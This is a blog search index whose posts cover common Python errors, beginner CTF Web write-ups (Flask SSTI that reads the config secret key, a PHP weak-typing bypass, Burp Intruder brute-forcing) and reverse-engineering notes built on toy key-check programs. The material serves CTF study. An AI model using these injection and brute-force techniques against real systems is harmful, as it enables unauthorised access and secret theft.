<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python程序运行常见错误总结</title>
    <url>/2022/01/02/Python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>Python程序运行常见错误总结</p>
<span id="more"></span>

<h2 id="1-SyntaxError-invalid-syntax"><a href="#1-SyntaxError-invalid-syntax" class="headerlink" title="1.SyntaxError:invalid syntax"></a>1.SyntaxError:invalid syntax</h2><p>语法错误：非法的语法。这种错误很常见，根据系统提示好好检查代码即可，看报错信息在第几行，从这一行往上找错误。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> i=<span class="number">3</span>:	</span><br><span class="line"></span><br><span class="line">SyntaxError: invalid syntax</span><br></pre></td></tr></table></figure>

<h2 id="2-NameError-name-‘q’-is-not-defined"><a href="#2-NameError-name-‘q’-is-not-defined" class="headerlink" title="2.NameError: name ‘q’ is not defined"></a>2.NameError: name ‘q’ is not defined</h2><p>变量名错误：’q’未定义。解决方法是在前面给q赋值，还有一种可能是变量或者函数名拼写错误。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#0&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  q</span><br><span class="line"></span><br><span class="line">NameError: name <span class="string">&#x27;q&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<h2 id="3-Indentation-Error"><a href="#3-Indentation-Error" class="headerlink" title="3.Indentation Error"></a>3.Indentation Error</h2><p>缩进错误：Python的缩进非常严格，行首多个空格，少个空格都会报错。 像def，class，if，for，while等代码块都需要缩进。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">j=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i&lt;j:</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">IndentationError: expected an indented block</span><br></pre></td></tr></table></figure>

<h2 id="4-IndexError-string-index-out-of-range"><a href="#4-IndexError-string-index-out-of-range" class="headerlink" title="4.IndexError: string index out of range"></a>4.IndexError: string index out of range</h2><p>索引错误：字符串超出了范围。解决办法：查看字符串的长度，索引要小于长度。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#8&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  s[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">IndexError: string index out of <span class="built_in">range</span></span><br></pre></td></tr></table></figure>

<h2 id="5-ValueError-substring-not-found"><a href="#5-ValueError-substring-not-found" class="headerlink" title="5.ValueError: substring not found"></a>5.ValueError: substring not found</h2><p>值错误：子字符串未找到。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2=<span class="string">&#x27;ei&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1.index(s2)</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#11&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  s1.index(s2)</span><br><span class="line"></span><br><span class="line">ValueError: substring <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>

<h2 id="6-IndexError-list-index-out-of-range"><a href="#6-IndexError-list-index-out-of-range" class="headerlink" title="6.IndexError: list index out of range"></a>6.IndexError: list index out of range</h2><p>索引错误：列表索引超出范围。解决办法：查看列表的长度，索引要小于长度。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#5&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  L[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">IndexError: <span class="built_in">list</span> index out of <span class="built_in">range</span></span><br></pre></td></tr></table></figure>

<h2 id="7-AttributeError-‘tuple’-object-has-no-attribute-‘remove’"><a href="#7-AttributeError-‘tuple’-object-has-no-attribute-‘remove’" class="headerlink" title="7.AttributeError: ‘tuple’ object has no attribute ‘remove’"></a>7.AttributeError: ‘tuple’ object has no attribute ‘remove’</h2><p>属性错误：元组对象没有属性’remove’。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t=(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t.remove(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#13&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  t.remove(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">AttributeError: <span class="string">&#x27;tuple&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;remove&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="8-KeyError-‘ff’"><a href="#8-KeyError-‘ff’" class="headerlink" title="8.KeyError: ‘ff’"></a>8.KeyError: ‘ff’</h2><p>key 键错误：没有指定的键值“ff”</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">\&gt;&gt;&gt; <span class="built_in">dict</span>[<span class="string">&#x27;ff&#x27;</span>]</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#3&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">dict</span>[<span class="string">&#x27;ff&#x27;</span>]</span><br><span class="line"></span><br><span class="line">KeyError: <span class="string">&#x27;ff&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="9-TypeError-pop-expected-at-least-1-arguments-got-0"><a href="#9-TypeError-pop-expected-at-least-1-arguments-got-0" class="headerlink" title="9.TypeError: pop expected at least 1 arguments, got 0"></a>9.TypeError: pop expected at least 1 arguments, got 0</h2><p>类型错误：pop方法希望得到至少一个参数，但是现在参数为0。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>.pop()</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#7&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">dict</span>.pop()</span><br><span class="line"></span><br><span class="line">TypeError: pop expected at least <span class="number">1</span> arguments, got <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="10-TypeError-Can’t-convert-‘int’-object-to-str-implicitl"><a href="#10-TypeError-Can’t-convert-‘int’-object-to-str-implicitl" class="headerlink" title="10.TypeError: Can’t convert ‘int’ object to str implicitl"></a>10.TypeError: Can’t convert ‘int’ object to str implicitl</h2><p>类型错误：不能转换整形成字符串。解决办法：使用+拼接时必须使用字符串，或将数字转化成字符串str()</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;hello&#x27;</span>+<span class="number">9</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#9&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  <span class="string">&#x27;hello&#x27;</span>+<span class="number">9</span></span><br><span class="line"></span><br><span class="line">TypeError: Can<span class="string">&#x27;t convert &#x27;</span><span class="built_in">int</span><span class="string">&#x27; object to str implicitly</span></span><br></pre></td></tr></table></figure>

<h2 id="11-SyntaxError-EOL-while-scanning-string-literal"><a href="#11-SyntaxError-EOL-while-scanning-string-literal" class="headerlink" title="11. SyntaxError: EOL while scanning string literal"></a>11. SyntaxError: EOL while scanning string literal</h2><p>语法错误：在字符串首尾忘记加引号。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;hello)    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SyntaxError: EOL while scanning string literal</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">12. TypeError: &#x27;</span><span class="built_in">range</span><span class="string">&#x27; object does not support item assignment</span></span><br></pre></td></tr></table></figure>

<p>类型错误：range不支持item操作。range() 返回的是“range object”，而不是实际的 list 值。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l=<span class="built_in">range</span>(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l[<span class="number">3</span>]=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#8&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  l[<span class="number">3</span>]=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">TypeError: <span class="string">&#x27;range&#x27;</span> <span class="built_in">object</span> does <span class="keyword">not</span> support item assignment</span><br><span class="line"></span><br><span class="line">可改为：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l[<span class="number">3</span>]=<span class="number">16</span></span><br></pre></td></tr></table></figure>

<h2 id="13-IndentationError-unindent-does-not-match-any-outer-indentation-level"><a href="#13-IndentationError-unindent-does-not-match-any-outer-indentation-level" class="headerlink" title="13. IndentationError:unindent does not match any outer indentation level"></a>13. IndentationError:unindent does not match any outer indentation level</h2><p>缩进错误：未知缩进不匹配任何缩进等级。缩进混乱造成。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">​	j=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">​    k=<span class="number">3</span>    </span><br><span class="line"></span><br><span class="line">SyntaxError: unindent does <span class="keyword">not</span> match <span class="built_in">any</span> outer indentation level</span><br></pre></td></tr></table></figure>

<h2 id="14-FileNotFoundError-Errno-2-No-such-file-or-directory-‘file1’"><a href="#14-FileNotFoundError-Errno-2-No-such-file-or-directory-‘file1’" class="headerlink" title="14. FileNotFoundError: [Errno 2] No such file or directory: ‘file1’"></a>14. FileNotFoundError: [Errno 2] No such file or directory: ‘file1’</h2><p>文件不存在：尝试打开一个不存在的磁盘文件或目录。</p>
<p>错误例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=<span class="built_in">open</span>(<span class="string">&#x27;file1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line"></span><br><span class="line"> File <span class="string">&quot;&lt;pyshell#15&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"></span><br><span class="line">  f=<span class="built_in">open</span>(<span class="string">&#x27;file1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">FileNotFoundError: [Errno <span class="number">2</span>] No such file <span class="keyword">or</span> directory: <span class="string">&#x27;file1&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Python类</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Web刷题</title>
    <url>/2022/01/11/Web%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<p>Web经典题型及其相关解题步骤</p>
<span id="more"></span>

<h1 id="Get和Post"><a href="#Get和Post" class="headerlink" title="Get和Post"></a>Get和Post</h1><p>在web中最简单且最重要的就是get和post的相关方法，对于Get的方法如下：</p>
<p>借用Bugctf平台中的题</p>
<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/1.png" alt=" "></p>
<p>Get就是直接在网址上面直接加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/？***</span><br></pre></td></tr></table></figure>

<p>具体根据对应题来写。</p>
<p>对于Post的方法如下：</p>
<p>Post需要借助相关插件hackber来进行，这在各浏览器都可以下载，推荐使用火狐浏览器</p>
<p>这个的借用题和上面的Get几乎一样，这里就不放图了，上重点，用hackber<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/3.png" alt=" "></p>
<p>然后根据题意<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/4.png" alt=" "></p>
<p>就可以顺利得到flag<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/2.png" alt=" "></p>
<h1 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h1><p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/20210528104247407.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>这个题目是<code>SSTI</code>（<code>Server-Side Template Injection</code>）服务器端模板注入</p>
</li>
<li><p>查看源代码，下方提示的是<code>flask</code>和<code>secret_key</code><br><code>flask</code>是<code>python</code>的一个<code>web</code>框架</p>
</li>
<li><p>相关资料参考一下链接</p>
</li>
</ul>
<p>拿到题先看源代码<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtYWxsZm94MjMz,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>要我们传入一个flag参数，用post直接报错，那么就选择采用get方式，看源代码发现在<a href="https://so.csdn.net/so/search?q=flask">flask</a>里，经常设置一个secret_key变量。</p>
<blockquote>
<p>传入一个<code>flag</code>参数，用两个括号括起来一个表达式或者是变量，返回对应的表达式或变量的值。</p>
</blockquote>
<p>尝试后发现成功回显，则输入config查看变量内容<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/20210707190048792.png" alt="在这里插入图片描述"></p>
<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/5.png" alt=" "></p>
<p>在这里找到了flag！</p>
<p>其次，因为题目提示<code>flag</code>值是在<code>SECRET_KEY</code>中，也可以修改成<code>config.SECRET_KEY</code>来访问变量的值<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtYWxsZm94MjMz,size_16,color_FFFFFF,t_70-16418967980484.png" alt="在这里插入图片描述"></p>
<h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/%E7%9F%9B%E7%9B%BE.png" alt=" "></p>
<blockquote>
<p>这是php弱类型，题的意思就是如果num不能是数字就输出num，如果num=1就输出flag{}，看似矛盾其实不矛盾，只需要/？flag=1*就可以，就是让1后面有其他字符，这样两个式子都成立，就可以得到flag。</p>
<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/%E7%9F%9B%E7%9B%BE%E7%AD%94%E6%A1%88.png" alt=" "></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF-wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf之reverse</title>
    <url>/2022/01/01/ctf%E4%B9%8Breverse/</url>
    <content><![CDATA[<p>CTF中的Reverse领域的入门学习</p>
<span id="more"></span>

<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>​     不说题外话，经过一学期的学习和参加一次CTF大赛后，对于reverse的最直观的印象就是写脚本，写各种程序，不论是很简单的reverse题还是较为复杂的，甚至有时候思路很明确，写出来脚本之后flag就到手了。</p>
<p>​      总而言之，对于reverse，如果想学精学透，最基础的应该就是从脚本下手，多刷题，多写脚本，而对于解题方便，脚本语言习惯上使用python，所以学好python，非常重要，不仅仅是python，多掌握一门语言没有坏处，学习C语言也是必不可少的。</p>
<h1 id="逆向的核心"><a href="#逆向的核心" class="headerlink" title="逆向的核心"></a>逆向的核心</h1><p>​      学习逆向不仅仅要学好语言，最重要的核心是破解验证算法，要学好算法！</p>
<h2 id="验证算法如下"><a href="#验证算法如下" class="headerlink" title="验证算法如下"></a>验证算法如下</h2><p>   输入：key</p>
<p>   验证：if H(key)==Secret</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    flag=O(key);</span><br><span class="line">    print flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>   输出：flag</p>
<h2 id="验证算法分类"><a href="#验证算法分类" class="headerlink" title="验证算法分类"></a>验证算法分类</h2><p>1.简单比较验证</p>
<p>2.密码算法验证</p>
<p>3.算法求解验证</p>
<h2 id="算法举例如下："><a href="#算法举例如下：" class="headerlink" title="算法举例如下："></a>算法举例如下：</h2><h3 id="1-key直接比较"><a href="#1-key直接比较" class="headerlink" title="1.key直接比较"></a>1.key直接比较</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input Key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szKey);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strncmp</span>(szKey,<span class="string">&quot;Thi5_i5_TOo_E4sy&quot;</span>,<span class="number">16</span>)==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;flag is your key!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please decompiler or debug me!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 这种类型flag就在其中，善于观察即可！</p>
<h3 id="2-key简单变换"><a href="#2-key简单变换" class="headerlink" title="2.key简单变换"></a>2.key简单变换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> secret[]=<span class="string">&quot;\x58\x31\x70\x5C\x35\x76\x59\x69\x38\x7D\x55\x63\x38\x7F\x6A&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;,szXor[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input Key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szKey);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;strien(szKey);i++)</span><br><span class="line">	&#123;</span><br><span class="line">		szXor[i]=szKey[i]^i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(szXor,secret,<span class="keyword">sizeof</span>(secret))==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;xman&#123;%s&#125;\r\n&quot;</span>,szKey);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please reverse me!\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个用异或，再进行一次就出来了，见识短浅的我表示还再学习学习才能明白。</p>
<h3 id="3-key编码转换"><a href="#3-key编码转换" class="headerlink" title="3.key编码转换"></a>3.key编码转换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> secret[]=<span class="string">&quot;QjRzZTYOX2k1X2MwbW1vbg==&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;,szBase64[<span class="number">40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szkey);</span><br><span class="line">	Base64encode(szBase64,szKey,<span class="built_in">strlen</span>(szkey));</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(szBase64,secret,<span class="keyword">sizeof</span>(serect))==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;xman&#123;%s&#125;\r\n&quot;</span>,szKey);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please reverse me!\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种转换常见为Base64，也不排除会出现其他编码！</p>
<h3 id="4-key散列计算"><a href="#4-key散列计算" class="headerlink" title="4.key散列计算"></a>4.key散列计算</h3><p>这种类型的，可以用md5进行反查</p>
<h2 id="验证算法逆向思路"><a href="#验证算法逆向思路" class="headerlink" title="验证算法逆向思路"></a>验证算法逆向思路</h2><h3 id="简单变化验证"><a href="#简单变化验证" class="headerlink" title="简单变化验证"></a>简单变化验证</h3><p>—-人工逆向，找到可逆运算，按位分步破解</p>
<h3 id="密码算法验证"><a href="#密码算法验证" class="headerlink" title="密码算法验证"></a>密码算法验证</h3><p>—-识别密码算法，针对性解密</p>
<h3 id="解题算法验证"><a href="#解题算法验证" class="headerlink" title="解题算法验证"></a>解题算法验证</h3><p>—-理解算法原理，针对性解题</p>
<h3 id="验证常见漏洞"><a href="#验证常见漏洞" class="headerlink" title="验证常见漏洞"></a>验证常见漏洞</h3><p>—-直接输出flag</p>
<p>—-密钥空间过短</p>
<p>—-伪随机算法</p>
<h3 id="现实竞赛"><a href="#现实竞赛" class="headerlink" title="现实竞赛"></a>现实竞赛</h3><p>—-分段，嵌套验证</p>
<h3 id="爆破奇招"><a href="#爆破奇招" class="headerlink" title="爆破奇招"></a>爆破奇招</h3><p>—-简单验证（按位破解）</p>
<p>—-密码算法（密钥部分已知）</p>
<p>—-解题算法（暴力搜索）</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>要学会用F5做签到题，害，暂时就写到这吧，先学好就是多刷题，goodbye！！！</p>
<h1 id="练习平台"><a href="#练习平台" class="headerlink" title="练习平台"></a>练习平台</h1><p>1.i春秋训练平台：<a href="https://www.ichunqiu.com/battalion">https://www.ichunqiu.com/battalion</a></p>
<p>2.We Chall:  <a href="http://www.wechall.net/sites.php">http://www.wechall.net/sites.php</a></p>
<p>3.很炫酷游戏化————<a href="https://microcorruption.com/login">https://microcorruption.com/login</a></p>
<p>4.<a href="https://adworld.xctf.org.cn/">攻防世界 (xctf.org.cn)</a></p>
]]></content>
      <categories>
        <category>CTF-Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse刷题</title>
    <url>/2022/01/11/reverse%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b9740b49ba8d5a2ba58a3a5a1d298a7a2678ebd5787a15e7fb4dee66f2ace6b5">4630436162ade97ba2718b7d0c4b3b63b227c165506ae031c31846e1da8c45c4c0a7cc326d22f283fbcca1b3ce546eecc00ee4bcb6cbe7bc4ed8b9e46b80ddb54b07008bde485dbeb0aa3df65562e5e8e10f6ee99610e15930bf45160c8f1c50749835cb686070bf47f1e63ac674ccb4</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF-wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf之Web</title>
    <url>/2022/01/08/ctf%E4%B9%8Bweb/</url>
    <content><![CDATA[<p>CTF中的Web领域的入门学习</p>
<span id="more"></span>

<p>CTF中Web题的相关解题步骤，大致都要走以下方法：</p>
<h1 id="1-看源码"><a href="#1-看源码" class="headerlink" title="1. 看源码"></a>1. 看源码</h1><p>右键-&gt;【查看网页源代码】，F12也可以，看网页的源代码，一些签到题或者比较简单的题型都可以直接通过看源代码得到flag，个别题也可以在源代码里得到相关提示。</p>
<h1 id="2-抓包"><a href="#2-抓包" class="headerlink" title="2. 抓包"></a>2. 抓包</h1><p>抓包也是做web常用的方法，而抓包最常用的一般是burpsuite，常用的是【send to Repeater】用于多次尝试，【send to Intruder】用于对某个字段进行爆破，这是比较常用的两种功能。</p>
<h1 id="3-经常关注的几个地方"><a href="#3-经常关注的几个地方" class="headerlink" title="3. 经常关注的几个地方"></a>3. 经常关注的几个地方</h1><p>多刷题后就会发现很多经常需要关注的地方，有时候打开网页后感觉没有可疑的地方，首先查看下源代码，看有没有注释之类的提示信息，之后重新打开网页，抓抓包看下请求包响应包的包头数据有没有可疑的地方。</p>
